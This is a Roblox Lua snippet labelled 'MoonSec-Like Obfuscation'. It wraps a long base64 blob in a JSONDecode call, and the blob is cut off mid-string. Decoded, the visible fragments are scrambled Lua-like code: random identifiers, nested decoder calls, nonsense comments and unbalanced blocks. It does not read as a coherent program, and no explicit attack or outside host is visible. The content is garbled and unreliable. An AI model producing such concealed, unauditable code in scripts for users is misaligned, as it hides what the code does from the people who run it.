-- MoonSec-Like Obfuscation
local b=game:service("HttpService"):JSONDecode("{\"code\":\"CiAgICB7CmxvY2FsIE9hUGtrWk5SQ0MgPSBuaWwKICAgICAgICAgICAgICAgIFhFYVFLenhkSm0gPSB0cnVlLAogICAgc0lGTU5iTWlwUSA9IFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISygiIikpKSkpKSksCiAgICAgICAgICAgIGVuZApsb2NhbCBid2VKcUh6VU1JID0gY1RRZFJNSFBiVS56d1VMVFJxb0NVOnFvTFR3cFR1aFkoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9b1dpRmRQVG1leSIpKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGxvY2FsIHZvYUJzc1FhTlUgPSBQeWR4VHhzRURBLnBTUGhOckZZTGk6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09c2NlV3ZNckh6YiIpKQogICAgc0lGTU5iTWlwUSA9IFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISygiIikpKSkpKSksCiAgICAgICAgaWYgSklTaVF2ZE5oTiB0aGVuCiAgICAgICAgICAgIApsb2NhbCBueGlpUllCeEZZID0gZmFsc2UgIC0tIFJ0a1Z3TGNTYW8gRW94cG9iVEd4aCBSWk9Dd05id1F6CgogICAgICAgICAgICAgICAgICAgIG9ITU1TekNETnUuWnlLYUhjVHFpRyA9IHRydWUKLS0gQXhwUW5Fc3RtTCBMR25qcmZ1WXNhIFFMSWhWdFJpak4gWEl6cnNpTUlQRSBrWU9XUlVqZnJyIHRBWGJXenNYQ2IKCi0tIH0KICAgICAgICAgICAgICAgIGxGdmpySkdtbVQuYUxnREFEdnJRUi5ndERMcGJ6TW12ID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCIwTldaMDltY1FCaVkxaGtiaGhHViIpCiAgICBzbXprZmRYWVdkCiAgICAgICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiemlQY2ZJclFReiIpLApsb2NhbCBmdW5jdGlvbiBwT29ObUVYSHZMKCkKICAgICAgICAgICAgbG9jYWwgS1VQdk9VdVhQbiA9IFpjZm9WQnNvREEuYWlEVWtOaGRlWihDbWV2bmJqQlBaKCkgLSBIYUlwRVZkZlNhKQogICAgICAgICAgICAgICAgICAgIC0tIG5DZ1BoalJjT3MgVWJJWkFLb3JnQiBBWFdSWW5kclRsLCBHVlJWemx6SGZNIFViSVpBS29yZ0Iga0dhSkNteUFPTQogICAgICAgICAgICBsb2NhbCBOV1ZPblR0SGRvID0KICAgICAgICAgICAgICAgIENrWGRNRHFSQloubUhmQWdMQVl4TChtdFVER2l1Z0NLKQpsb2NhbCBSZm1ZWm5pbldnID0gZmFsc2UKICAgICAgICAgICAgZW5kCgoKICAgIH0KZFdFQ0tLdXZmYjpKUEVzb2drZ2JUKAogICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgUXl6b2RkS2JGRCA9IGNvaWFtSGFmTFguV2dydmxibHZMZiAtIHpGUkVhaEJoZGgubGFpbk9rZ0tmdygwLCAxMCwgMCkKLS0gY1JxcmZKaUdrbyBrcm9PeVJ2U1JDIGt6RG9XbHJPcVMgYmZXT0pMV1pyTiBkVmlIZElmTGZmCiAgICAgICAgICAgIElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1ocmVJbXZPUFRsIikpOlprbnhTTkpJb3koCiAgICAgICAgICAgICAgICAgICAgfQpsb2NhbCBmdW5jdGlvbiBjTnprQUZQcm5oKCkKbG9jYWwgcG5ucEZ0UW9vaiA9CiAgICB7CiAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCIwVjJaeUZHVmdjbWJwUm5iMWhFSTBOV1pzVjJVIiksCmtUUFFLQVNqcUEuV0RPSXlDVHd4UDpuenZGeFRDRGNEKAoKCi0tIFNHYklqSkZFaW4gelllSHlPY3FJUiBxdGt6QnRXSXZpIEVFREp3TEhQeWUgV3pLd29WcnFQbAogICAgICAgICAgICAgICAgeU9xQ3VjcVJvcy50S0dqSmhRT2lIID0gdEJ6ZE5CY1hOZi5uUmtFckdKbkp3KDI1NSwgMjU1LCAyNTUpCiAgICBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09d2xmWEhNRnJNVyIpLAogICAgICAgICAgICAgICAgSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiPWRDV2hJaFNHZVEiKSkuS0doaktmcE5oVTp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiNXQyVSIpKS50anVXbFRzWHplID0gSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiPWRDV2hJaFNHZVEiKSkKICAgIH0KCiAgICAgICAga1NTUHhFekRaViA9IERLT2doZGpwcmMKICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PU14TWZ4ZHRVRngiKSwKICAgICAgICAgICAgICAgIFB1THFCQ0xpWGYgbWVpemdRQkJaaSA9PSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1rZkFOclB6cURtIikgTEpXVGRiUGFsdwotLSB5Wlhma0VYUENtLmd0RExwYnpNbXYgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09dEhaVlFkeGtacCIpCiAgICAgICAgICAgICAgICBpZiB6RENoU0hlS3FhLkxUZ1p5dnBqSXogdGhlbgpiTEx5RUhxWGZaLlpudEloUVlDS3cgPSAxCm1ra0lYaHlGWnE6V0tJV1NJRFdHbChXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIkFPTGV1bk1tVFUiKSkKICAgICAgICAgICAgICAgIHluU2pJUURuTnM6Qlh0RG5zd3VNRSgpCiAgICAgICAgZW5kCgpsb2NhbCBYUXV4V2hEWHBLID0gZmFsc2UKICAgIGZ1bmN0aW9uKERLT2doZGpwcmMpCiAgICAgICAgICAgICAgICAgICAgTkFUQ1FwcFZBUS5Jc3dGbkVvdXlFLmd0RExwYnpNbXYgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1iT0lidVV0RHRuIikKbG9jYWwgZnVuY3Rpb24gc1lGcGhZeHlXYygpCmVuZAp5bHVrbVJ4aVBlOkpQRXNvZ2tnYlQoCgogICAgICAgICAgICAgICAgc0lGTU5iTWlwUSA9IFNtcUFQUVNGTmIsCiAgICAgICAgICAgICAgICBsb2NhbCBSSk9BUm1ZV29tID0KCgogICAgICAgIC0tIGhOcG9FSkRzZHAgWEROckxnRExrcyBTZGVRa3FsaEx3IFJaT0N3TmJ3UXogRXVpUGlOZGdoRyBWS29Xc3liSGtWCiAgICAgICAgICAgICAgICAgICAgICAgIEJvTGh2ZnlaSm0uVWVQWEdkUEpoTy54Zm1vclVndFFYOlVjdGNLZERLckkoKQpsb2NhbCBRUnVVc2RCRnZwID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJEY09DcWFZd0ZLIikKLS0gSGxsT25zQW14Qi5KUHhOc0VlcWtpID0gdEJ6ZE5CY1hOZi5uUmtFckdKbkp3KDI1NSwgMjU1LCAyNTUpIC0tIE1vTlBEa1JUd2MgU1hZUUNWaUZtdyBiZldPSkxXWnJOIG9UZFFGcHNFd3YKICAgIHp3VUxUUnFvQ1UgPSBDUGdwcHV4Yk5XOkR3YWZSQm9DZWIoe3RhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09TUNWSkpneVdaTiIpLCBjUGhYZXBZZU5hID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI1Y0ROeVVUTzBNek53RXpMdm9EWnBSWFp6TlhZNEptYyIpfSksCiAgICAgICAgICAgICAgICBlbmQKfSkKICAgICAgICB2WWtUdWladlZkLnJOQ1JCYVVHckYgPSBIZ3NEbW5YeWdXCiAgICAgICAgICAgIC0tIG9xTlJpSlpzR1ggcnhndVN0Wm9FciBldGdjZHdJWEdzJCBNTlhOWmNWS05NIG1vZlZmZkRPYlQgTmpUZUF0RkdESAogICAgbG9jYWwgUWVKTUxTRENiUCA9IHBPb05tRVhIdkwoKQoKICAgICAgICBpZiBES09naGRqcHJjIHRoZW4KICAgICAgICAgICAgaWYgb1BadHVKRlFSSyBCeHRQVWZUUlRKIG9QWnR1SkZRUksgfj0gV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKCIiKSkpKSkpKSBCeHRQVWZUUlRKIFdETVBoQWFBb20uYUtLZ0R3SWhicShvUFp0dUpGUVJLKSA9PSAzNiB0aGVuCikKbG9jYWwgaHlJTXVEZnJKbSA9IHRydWUKICAgICAgICBpUWxtTnhKUHBaID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJpR0FQb0pua3dxIiksCiAgICAgICAgKQpsb2NhbCBQeWR4VHhzRURBID0gdG1aZGRrbUdNci5QeWR4VHhzRURBCiAgICAgICAgICAgICAgICAgICAgLS0gcVhkd3ZLVXJ2WiBySlZGdnFCa0haIGFmYUJhUUF2Y3YKICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9UmJtenFtV01NbCIpLApsb2NhbCBBWFRiekVMUEh0ID0gWmpQZHFYUG5uWDp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPWtIamVUVlJ6UHgiKSk6RUxqY3lHZnhreihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09WUZhY0hRU2pDUCIpKQogICAgV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9T3ZMQUR2QlpxZSIpLAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIHdubENuUWJzQ0wgQnh0UFVmVFJUSiBMT0RzbkdvSXpFIH49IG5pbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgd25sQ25RYnNDTCBCeHRQVWZUUlRKIENYWElIb0lFR2QudGp1V2xUc1h6ZSB+PSBuaWwgdGhlbgpUakhtTllFRnJROkpQRXNvZ2tnYlQoCiAgICAgICAgaFhUbVhrc0ZKTyBQY3BjcmtSbEJ6LCBJbnlQUkhyaFdVIEpabG91aHBIbFQgbnhPZ1JqYXdmRShPS3FJclpyd2RuKSBMSldUZGJQYWx3Ci0tIEtYbExMcUptSVogdmtkV0tneUl4SSBwbXNQeUpXZkFpCiAgICAgICAgTXRWS1pCQWRmTCA9IDIwMCwKICAgICAgICAgICAgICAgICAgICBNcHBiaVhYYW9JLAogICAgY1RRZFJNSFBiVS5nanVsRnBJSkVHOkF6U1hBUlBuWlAoCiAgICAgICAgZW5kCmJMTHlFSHFYZlouaEVsSU1aVHNnayA9IDAuMgogICAgICAgIGVuZAogICAgZnVuY3Rpb24oc2NVWWhEcUFMUykKICAgICAgICByZXR1cm4ge1dETVBoQWFBb20udHRCQnpoWlRISygiPT1kVGZFcXRzemJiIil9CikKICAgIGxvY2FsIEFYVGJ6RUxQSHQgPSBEQmRLWmxtSXpGIEJ4dFBVZlRSVEogREJkS1psbUl6RjpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiPT1ZRmFjSFFTakNQIiksIDUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2SFNvRHlOY3JFOlVHUEdySExTcGcoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PXlXdkRNamJKTlkiKSkKICAgICAgICAgICAgICAgIGVuZAopCiAgICBQdUxxQkNMaVhmIE5mWGpJc2dOeGcuSGdzRG1uWHlnVyBMSldUZGJQYWx3CiAgICAgICAgICAgICAgICBzbXprZmRYWVdkCiAgICAgICAgb3ZJdmhoWEVXRShzbEptY3RVSlpNLldncnZsYmx2TGYpCiAgICAgICAgVWNNQk9yTnV2ZDpjemVRdHBkVlVYKHFaS0llTmlXR3UubUVic0RLYkRQWi5hdVRackFPVEhiLCBmYWxzZSkKCiAgICAgICAgaWYgSkhKUmVrdHZtWCB0aGVuCiAgICAgICAgZW5kCiAgICAgICAgICAgIGN5bWtHWWVXdEk6Y3lPZ1ZHaUFweSgKICAgICAgICAgICAgICAgICAgICAgICAgaWYgUWVKTUxTRENiUCB0aGVuCiAgICB9CgogICAgV0RNUGhBYUFvbS50dEJCemhaVEhLKCJ0clp2WGlOcE9XIiksCi0tIGt6RG9XbHJPcVMgYmZXT0pMV1pyTiBYcE5MdHRobVp4IFhJenJzaU1JUEUKICAgIGVuZAoKICAgICAgICAgICAgcFNQaE5yRllMaS5OQVRDUXBwVkFRLnJ3VmdIRU5qWGMuelhNb3BmQ2VMQyA9IGZhbHNlCiAgICAgICAgUHVMcUJDTGlYZiB0cnVlIExKV1RkYlBhbHcKCiAgICAgICAgICAgICAgICBlbmQKICAgIHsKICAgICAgICBsb2NhbCBYZ3RORFBjY21xID0gbXpRQmJkclF4VC5Sb0p6cEh1bXNWOm56dkZ4VENEY0QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICB3Vk1ubFBSYUphID0gbVhsc0NweE52ci5sYWluT2tnS2Z3KG9ITU1TekNETnUuV2dydmxibHZMZiArIHpGUkVhaEJoZGgubGFpbk9rZ0tmdygwLCA3NCwgMCkpCi0tYUlLd2V0dmdkbyB2Qm1qYmRPT2NNIEJQTmFneU5UckYtLS0KICAgICAgICAgICAgLS0gTkFzZXdEcExoWCBtaGpLUkhHTGZ5IHJDUUpGVWpkYk8gY3FvSFJ4S2RkcyBVbHpuZnFPWnJuIHZrZFdLZ3lJeEkgQVhXUlluZHJUbAp9KQogICAgbG9jYWwgRE52T0lzTVhWZSA9IFB5ZHhUeHNFREEuRE52T0lzTVhWZQotLSBLRllrb2VOUUxnIHBOVlZNUlF6ak0KbG9jYWwgR0t3Z0xmRUFQaiA9IFB5ZHhUeHNFREE6RUxqY3lHZnhreihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1kZkhvR3dJcWJVIikpCmVDSWhSVVFnUHM6WGROSEh1SkZyWChIVW1GcnRrcW1WKQpsb2NhbCBYaXdaZWptcEJ4ID0gZmlNbXdvR0hUZC5sYWluT2tnS2Z3KFdETVBoQWFBb20udHRCQnpoWlRISygiPTQyYjBSWGRDVjJaaDFXUyIpKQpsb2NhbCBVcFRhQ3Z6Sld0ID0gY1RRZFJNSFBiVS5IcUpnbnh2YWlNOmJwQlJoV2NGY3AoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUhyV3hsbmthZWkiKSwge3RhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj11dWpYcWt1T3VoIiksIHNJRk1OYk1pcFEgPSBmYWxzZX0pCmVuZCAgICAKCkNQZ3BwdXhiTlc6Q2hicWppRndpbCgxKQogICAgICAgICAgICAgICAgZ1pwUlp0RnhCaC5aWXFMd0lzYmxuKFFnTFVDa090YlIsIElueVBSSHJoV1UudWlsSnJhVVJmSikKbG9jYWwgaVhJcWZiaWd1SCA9IHRydWUgLS0gc0lGTU5iTWlwUSBLY2pVSGtqaFhPIEhwVG5nekl2d3kgVEhta3BZbERVUQogICAgICAgIGxvY2FsIEFvZ05ITkp2RFIgPSB7fQogICAgICAgIHNZZENIc290cVA6Qlh0RG5zd3VNRSgpCiAgICBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj0wV1owOUdWNUZHUiIpLAogICAgICAgICAgICB0Q1hBZXlYYm1NKCkKICAgICAgICAgICAgICAgICAgICBpZiB2WWtUdWladlZkLllzY2ZXT0ZYY3QgPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUpWVGVacXBvakgiKSB0aGVuCiAgICBmdW5jdGlvbihzY1VZaERxQUxTKQotLSAvLyAvLyAvLyBjSkdJem5vWFRvIC8vIC8vIC8vIC0tCmxvY2FsIEZRSEl2TGNVWk0gPSBmaU1td29HSFRkLmxhaW5Pa2dLZncoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9YVNyd0dLWFBrbiIpKQogICAgICAgIHFXSWFMTFRuQW0gPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09UlJpbmhTRFVHRyIpLAotLSBEaUtPQ2RTb0pHLmtEYnNDY25zeFkgPSBxWktJZU5pV0d1LmtEYnNDY25zeFkubkl0eHJvVEhSVgoKICAgICAgICAgICAgZW5kCikKICAgICAgICAgICAgICAgIGxGdmpySkdtbVQuVE5CaFpVR05mYS5ndERMcGJ6TW12ID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9Yk9JYnVVdER0biIpCiAgICAgICAgICAgIEFZbHhzRGpOblEuQU15Y0tBUWhoYSgxMDApCi0tIC8vIC8vIC8vIHR2cnhSRmZkTlEgLy8gLy8gLy8gLS0KbG9jYWwgZnVuY3Rpb24geWNsbk9HaG1YbigpCgoKICAgIGVuZAogICAgICAgIGVuZApsb2NhbCBid2VKcUh6VU1JID0gY1RRZFJNSFBiVS5TR2JJakpGRWluOnFvTFR3cFR1aFkoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVd2b3J2RkZ5QUEiKSkKbG9jYWwgYndlSnFIelVNSSA9IGNUUWRSTUhQYlUuZ2p1bEZwSUpFRzpxb0xUd3BUdWhZKFdETVBoQWFBb20udHRCQnpoWlRISygiPVpHU3R5dHB6Y1ciKSkKICAgICAgICAgICAgICAgIFB1THFCQ0xpWGYgbWVpemdRQkJaaSA9PSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIjVGR1IiKSBMSldUZGJQYWx3CiAgICAgICAgICAgICAgICBsb2NhbCBCenRKVXNKWkpSID0gc0dMVFJPZUZ0bzp3TnFKaVRkeXBVKFBhanZQam5teFAuRE52T0lzTVhWZS51aWxKcmFVUmZKKQogICAgICAgICAgICAgICAgWERlTG9DVXhhRyhYUWtOUG9tc0ZtKQprVFBRS0FTanFBOm5sU0FpaWNYaXUoKQogICAgICAgICAgICAgICAgICAgICAgICBnWnBSWnRGeEJoLlpZcUx3SXNibG4oWGpZTlRiRVRGbCwgMSwgdkhTb0R5TmNyRSkKICAgICAgICAgICAgaWYgQXBiTHlnVGpDTiB0aGVuIApsb2NhbCBQYWp2UGpubXhQID0gSVJ3VmxMSEtNdS50bVpkZGttR01yLlB5ZHhUeHNFREEKICAgICAgICBzSUZNTmJNaXBRID0gZmFsc2UKICAgICAgICAgICAgeW5TaklRRG5OcyA9CiAgICAgICAgICAgIGxvY2FsIFF5em9kZEtiRkQgPSB6RlJFYWhCaGRoLmxhaW5Pa2dLZncoLTkzMS41MjUsIDIyMy43ODQsIC05ODYuODQ5KQogICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPWRSaG1zdWpZcUsiKSwKICAgICAgICAgICAgZW5kCiAgICBxSFlTVWdXVHlFID0gZmFsc2UsCiAgICAgICAgUHVMcUJDTGlYZiB0cnVlIExKV1RkYlBhbHcKICAgICAgICAgICAgaVFsbU54SlBwWiA9IFpmVWVuWm12c2QsCgoKICAgICAgICAgICAgICAgICAgICBQQ2FRUHNYTGxOLk9GSWJ0bW5zQUYgPSB6RlJFYWhCaGRoLmxhaW5Pa2dLZncoMCwgMCwgMCkgLS0gTVRpS1JjV1hzcyB6a1VvTnJFR1lOCiAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9MFdaMGxFSW9ObWNoVjJVIiksCiAgICBmdW5jdGlvbigpCgogICAgICAgICAgICAgICAgQVlseHNEak5uUS5BTXljS0FRaGhhKDAuNSkgLS0gRFJvaG9NTnVZRSBuZGtIclhORWdJIGxTUUhoZkJQakggdVdnbHNrU3JqSSBIVFhxeW5hT1h2CiAgICAgICAgSUZ2YlpncXpYTSA9IDAKLS0gLy8gLy8gLy8gTFhSYkJFcWlSeSBPcFpNa0NxRXZKIC8vIC8vIC8vIC0tCn0pCiAgICBpZiBCb0xodmZ5WkptOlVHUEdySExTcGcoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJ6bGZyc1RFaWJ4IikpIHRoZW4KICAgICAgICBxV0lhTExUbkFtID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJqc3pTZ3Z5dnFOIiksCi0tIC0tIHNvVE5jaVlQRVQgb1RkUUZwc0V3dgogICAgICAgICAgICBIdGZsTW9rWXhOOlZKTUdjakFzdWQobVhsc0NweE52ci5sYWluT2tnS2Z3KHl2Yk55bXVSSmkpKQogICAgaWYgelZubElubHpQTiA9PSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09ZFRmRXF0c3piYiIpIEJ4dFBVZlRSVEogRVJPZVRZdGNxeiB0aGVuCiAgICAgICAgaWYgcFlZdWFmaUV1UiB0aGVuCgogICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHZObm1IbklYY1c6WGJpQVR2Z1BVbChmYWxzZSwgcVpLSWVOaVdHdS5admdHQmtsYmZPLkJpTElMZUVSRGMsIGZhbHNlLCBJUndWbExIS011KQogICAgZW5kCiAgICBGQXdRVEpmYWlzID0gZmFsc2UsCiAgICBlbmQKICAgICAgICAgICAgICAgICAgICBiTEx5RUhxWGZaLAogICAgICAgICAgICAgICAgICAgIG9ITU1TekNETnUgPSBzR0xUUk9lRnRvLkRCZEtabG1JekYuVWFLRlVQaHRTdDp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1RTWhvU0VRb25CIikpCmNUUWRSTUhQYlUuZ1FJQVFubVp2dDpxb0xUd3BUdWhZKFdETVBoQWFBb20udHRCQnpoWlRISygiemlQT0Zpa1BVZiIpKQogICAgICAgIHNJRk1OYk1pcFEgPSBmYWxzZSwgLS0gc0lGTU5iTWlwUSB2V1FnUFNiZUdVIGtZT1dSVWpmcnIgSk9zZ2JhZWhjeiBSWk9Dd05id1F6CiAgICAgICAgICAgICAgICAgICAgY3lta0dZZVd0STpjeU9nVkdpQXB5KAogICAgICAgICAgICBmdW5jdGlvbigpCiAgICAgICAgc1pYbU1GWVVxTiA9IDEwCiAgICAgICAgc0lGTU5iTWlwUSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT14WGhVUWt5c3JiIiksCmxvY2FsIGZ1bmN0aW9uIFBFd2VjcnVoRGkoKQogICAgewogICAgICAgIGxvY2FsIEFDV0tVTWx5UEggPSBlVFhmVkJsaVp6KEtVUHZPVXVYUG4pCmVuZAoKbG9jYWwgYndlSnFIelVNSSA9IGNUUWRSTUhQYlUuaUxkb3BHV1VLUjpxb0xUd3BUdWhZKFdETVBoQWFBb20udHRCQnpoWlRISygibnBCY3Nla0pBbiIpKQoKCiAgICAgICAgZW5kCiAgICAgICAgaWYgU1VwY2FHZk1veiB0aGVuCiAgICB7Ci0tIHZjcFVHSFdmbGQgcXRrekJ0V0l2aQp5elFQdGRSUlpGLm50Y0hzbWVLT0ggPSBxWktJZU5pV0d1Lm50Y0hzbWVLT0guQVB0VmZLSVhNcAogICAgbG9jYWwgdXFRSmlScFJpdiA9IFpjZm9WQnNvREEuYWlEVWtOaGRlWihmeldJc0l2eXN5IC8gMzYwMCkKY1RRZFJNSFBiVS5pTGRvcEdXVUtSOmJwQlJoV2NGY3AoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUpKbmV2dXJaVFgiKSwgewogICAgICAgICAgICAgICAgICAgIGVuZAoKbG9jYWwgYndlSnFIelVNSSA9IGNUUWRSTUhQYlUuZ2p1bEZwSUpFRzpxb0xUd3BUdWhZKFdETVBoQWFBb20udHRCQnpoWlRISygiPVdDVHBIUGh5VEUiKSkKICAgICAgICAgICAgICAgIElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1qZVd5eGhQU0xQIikpOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCJXWkhQbm9MS2NzIikpOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUt0TFJoekVNeFciKSk6Y1J1ZE1PUUJaSygpCiAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PXZNTlZnYUVCZ2kiKSwKICAgIGVuZApsb2NhbCBQblFUUUVlbFdJID0gSFVtRnJ0a3FtVi5QblFUUUVlbFdJCiAgICAgICAgICAgICAgICBsRnZqckpHbW1ULnFCSlNhR3FVV3EuZ3RETHBiek1tdiA9IGtuTndIenJCS1Eua0lFU2dwdHZUcQplbmQKICAgIHsKICAgIHFXSWFMTFRuQW0gPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1zaEVscGdpUWtCIiksCiAgICBsb2NhbCBDVHJkTFdtUnZQID0gU25GQ2Jaalh2bzpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiPWtacm94bWJUb3IiKSk6RUxqY3lHZnhreihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIjBWbVQiKSk6RUxqY3lHZnhreihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1OWHRCTUVzZ0dnIikpCi0tIHlaWGZrRVhQQ20ua3JlYkt4SmhRayA9IHRydWUKbG9jYWwgc29PTnRIandsUyA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09Vm1mSGpLeFFXUiIpKQogICAgUHlkeFR4c0VEQS5ETnZPSXNNWFZlLmlOVlBOZUplQmE6bnp2RnhUQ0RjRChmdW5jdGlvbihvYlBLaHlvdWdUKQotLSBEaUtPQ2RTb0pHLlpudEloUVlDS3cgPSAxCiAgICBjWHVWb1ZxcWdsLmNYeUxpRGJUVFAgPSAwLjMKICAgICAgICAgICAgICAgICAgICBTbXFBUFFTRk5iID0gREtPZ2hkanByYwoKZEFIa2tpYVpDcDpKUEVzb2drZ2JUKAoKICAgICAgICAgICAgbG9jYWwgUGFqdlBqbm14UCA9IElSd1ZsTEhLTXUudG1aZGRrbUdNci5QeWR4VHhzRURBCmxvY2FsIE9CQmRkY0hvTnIgPSBmYWxzZQotLSBXekt3b1ZycVBsIG1HcHJ0S1Bha1AgYmZXT0pMV1pyTiBhZmFCYVFBdmN2CmZ1bmN0aW9uIGhmR1pTaFVacHMoWmZVZW5abXZzZCkKICAgIHNJRk1OYk1pcFEgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09SlZUZVpxcG9qSCIpLAotLSBCenl5TVRhWGNOIGJmV09KTFdack4gY3hQUmFJTnZLeSBKSEpSZWt0dm1YIFVsem5mcU9acm4gdldRZ1BTYmVHVSBUSG1rcFlsRFVRCmhYVG1Ya3NGSk8gUGNwY3JrUmxCeiwgQm9MaHZmeVpKbSBKWmxvdWhwSGxUIEduVXZMSG9zdU4oR0dVTm9yV2RhcTpEUVp6TERrcUFuKCkpIExKV1RkYlBhbHcKICAgIEFGYUJ6TmpVRmUoKQoKICAgICAgICAgICAgaFhUbVhrc0ZKTyBQY3BjcmtSbEJ6LCBvYlBLaHlvdWdUIEpabG91aHBIbFQgR25VdkxIb3N1TihPQ2VuTGhRdlRwOkRRWnpMRGtxQW4oKSkgTEpXVGRiUGFsdwotLSBkU2dvTWFCY25lCi0tIG9xTlJpSlpzR1ggRXVQaGZST1FLUyBiZldPSkxXWnJOIGV0Z2Nkd0lYR3MkIGZVYWRhV1VkSHUgTmpUZUF0RkdESAogICAgICAgICAgICAgICAgICAgICAgICB2SFNvRHlOY3JFLnRqdVdsVHNYemUgPSBuaWwKICAgICAgICAgICAgZW5kCmxvY2FsIFRqSG1OWUVGclEgPQoKICAgICAgICAgICAgRmtWcmlFR29uRigpCiAgICAgICAgICAgICAgICAgICAgaWYgYkVoSXFUem9UdCBrak54YUpBUnVnIHRoZW4geGpMaWZ2S2FPayBlbmQKCiAgICBjWHVWb1ZxcWdsLkNoa2JXWlhKQ3EgPSBIcGpLc3JvYVZRCiAgICAgICAgICAgIGlmIE51b3JtRmNNWlouSGdzRG1uWHlnVyB0aGVuCgogICAgICAgICAgICBQdUxxQkNMaVhmIE9DZW5MaFF2VHAgQnh0UFVmVFJUSiBPQ2VuTGhRdlRwOlFQaEJNZmlIQXQoUHlkeFR4c0VEQS5wU1BoTnJGWUxpKSBMSldUZGJQYWx3CmxvY2FsIE5mWGpJc2dOeGcgPQogICAgICAgICAgICAgICAgZ1pwUlp0RnhCaC5aWXFMd0lzYmxuKEFvZ05ITkp2RFIsIElueVBSSHJoV1UpCiAgICAgICAgaWYgUG5RVFFFZWxXSS5VcFRhQ3Z6Sld0Lkhnc0Rtblh5Z1cgPT0gdHJ1ZSB0aGVuCiAgICAgICAga0ZwYlhOaUlETyA9IGZ